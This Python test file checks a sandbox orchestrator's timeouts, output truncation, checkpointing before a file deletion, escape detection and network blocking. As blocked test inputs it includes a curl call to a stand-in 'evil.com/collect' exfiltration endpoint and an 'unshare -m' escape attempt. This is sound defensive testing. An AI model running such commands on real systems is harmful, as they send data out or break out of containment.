"""M3 sandbox orchestrator checks."""

from __future__ import annotations

import sys
from pathlib import Path

from shisad.core.session import CheckpointStore, SessionManager
from shisad.executors.mounts import FilesystemPolicy, MountRule
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.executors.sandbox import (
    DegradedModePolicy,
    ResourceLimits,
    SandboxConfig,
    SandboxOrchestrator,
    SandboxType,
)


def _resolver(_hostname: str) -> list[str]:
    return ["93.184.216.34"]


def test_m3_sandbox_timeout_and_output_truncation(tmp_path: Path) -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    timeout_result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "import time; time.sleep(2)"],
            limits=ResourceLimits(timeout_seconds=1, output_bytes=1024),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert timeout_result.allowed is True
    assert timeout_result.timed_out is True

    truncation_result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "print('x' * 8000)"],
            limits=ResourceLimits(timeout_seconds=5, output_bytes=128),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert truncation_result.allowed is True
    assert truncation_result.truncated is True
    assert len(truncation_result.stdout.encode("utf-8")) <= 128


def test_m3_sandbox_creates_checkpoint_for_destructive_commands(tmp_path: Path) -> None:
    checkpoint_store = CheckpointStore(tmp_path / "checkpoints")
    session = SessionManager().create(channel="cli")
    target = tmp_path / "notes.txt"
    target.write_text("hello", encoding="utf-8")

    orchestrator = SandboxOrchestrator(
        proxy=EgressProxy(resolver=_resolver),
        checkpoint_store=checkpoint_store,
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="file.write",
            command=["rm", "-f", str(target)],
            write_paths=[str(target)],
            filesystem=FilesystemPolicy(
                mounts=[MountRule(path=f"{tmp_path.as_posix()}/**", mode="rw")]
            ),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        ),
        session=session,
    )
    assert result.allowed is True
    assert bool(result.checkpoint_id)
    assert not target.exists()


def test_m3_sandbox_blocks_escape_signals_and_network_disabled_commands() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    escape = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=["unshare", "-m"],
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert escape.allowed is False
    assert escape.escape_detected is True
    assert "escape_signal" in escape.reason

    no_network = orchestrator.execute(
        SandboxConfig(
            tool_name="http_request",
            command=["curl", "https://evil.com/collect"],
            network=NetworkPolicy(allow_network=False, allowed_domains=[]),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert no_network.allowed is False
    assert no_network.reason == "network:network_disabled"


def test_m3_sandbox_fail_closed_on_degraded_security_critical_controls() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="http_request",
            command=[sys.executable, "-c", "print('ok')"],
            network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
            network_urls=["https://api.good.com/v1/ping"],
            sandbox_type=SandboxType.NSJAIL,
            security_critical=True,
            degraded_mode=DegradedModePolicy.FAIL_CLOSED,
        )
    )
    assert result.allowed is False
    assert result.reason == "degraded_enforcement"
    assert "network" in result.degraded_controls
